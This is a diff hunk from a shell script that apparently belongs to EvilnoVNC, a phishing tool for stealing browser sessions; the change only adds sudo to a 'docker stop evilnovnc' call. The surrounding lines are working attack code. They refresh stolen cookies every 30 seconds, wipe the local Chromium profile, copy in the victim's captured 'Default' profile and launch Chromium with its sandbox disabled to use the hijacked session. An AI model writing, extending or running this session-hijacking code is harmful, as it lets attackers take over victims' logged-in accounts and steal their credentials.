@@ -43,7 +43,7 @@ printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 3
 printf "\n\e[1;32m[+] Cookies will updated every 30 seconds.. \e[1;31m"
 
 trap 'printf "\n\e[1;33m[>] Import stealed session to Chromium.." ; sleep 3
-docker stop evilnovnc > /dev/null 2>&1 &
+sudo docker stop evilnovnc > /dev/null 2>&1 &
 rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
 printf "\n\e[1;32m[+] Done!\n\e[1;0m"
 /bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &' SIGTERM EXIT
